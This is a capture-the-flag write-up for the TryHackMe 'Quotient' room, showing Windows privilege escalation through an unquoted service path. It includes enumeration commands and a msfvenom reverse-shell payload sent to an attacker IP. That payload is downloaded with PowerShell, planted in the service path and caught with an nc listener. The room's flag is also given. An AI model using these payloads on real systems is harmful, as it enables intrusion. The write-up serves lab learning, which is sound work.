# [Quotient](https://tryhackme.com/room/quotient)

> Grammar is important. Don't believe me? Just see what happens when you forget punctuation.

## Connecting

use Remmina to log into the machine

![image](https://user-images.githubusercontent.com/90561566/212108979-46690c5e-0411-4eac-bfac-bf90b7635596.png)

## Enumeration

open cmd and start enumerate

```
systeminfo
```

![image](https://user-images.githubusercontent.com/90561566/212110846-63406f21-4cd1-466d-966a-ad8e78a013d6.png)

```
net user
```

![image](https://user-images.githubusercontent.com/90561566/212111046-c385d822-f07c-41e0-b7d0-029e53131edb.png)

Check `whoami /priv`. This can reveal some very easy ways to escalate, but we're unlucky this time:

![image](https://user-images.githubusercontent.com/90561566/212111225-7aef4c5e-7e52-4702-83d1-8f938bcd4f0f.png)

list all services which contains no space (very useful with abnormal)

```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

![image](https://user-images.githubusercontent.com/90561566/212112229-c5355cdb-a2ca-42b1-8855-bd3131d03343.png)

Get some more information about the service

```
sc qc "Development Service"
```

![image](https://user-images.githubusercontent.com/90561566/212112847-f9b44b80-1223-482d-bb80-0cf303233b42.png)

This path is definetly unquoted. The Start Type is AUTO_START, so we have to look at this again

Upon boot (because of Start Type: AUTO_START) this service searches for the exe in this order:

+ C:\Program.exe
+ C:\Program Files\Development.exe
+ C:\Program Files\Development Files\Devservice.exe
+ C:\Program Files\Development Files\Devservice Files\Service.exe

Generate a payload

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.74 LPORT=4444 -f exe -o Devservice.exe
python3 -m http.server
```

```
cd C:\Program Files\Development Files
powershell
wget http://10.8.0.74:8000/Devservice.exe -OutFile Devservice.exe
dir
```

![image](https://user-images.githubusercontent.com/90561566/212116379-7c7b0747-2f51-4391-8e1c-e547f0a02196.png)

open listener

```
nc -vlnp 4444
```

restart the machine

```
shutdown /r /t 0
```

after reboot, when it turn on back, you will get the shell

![image](https://user-images.githubusercontent.com/90561566/212118234-81488a29-5adc-4f65-bf23-854e3fb174b2.png)

![image](https://user-images.githubusercontent.com/90561566/212118624-9e5e2a62-512a-4f23-aca1-a6d22d158211.png)

| Flag | flag.txt |
| --- | --- |
| Answer | THM{USPE_SUCCESS} |
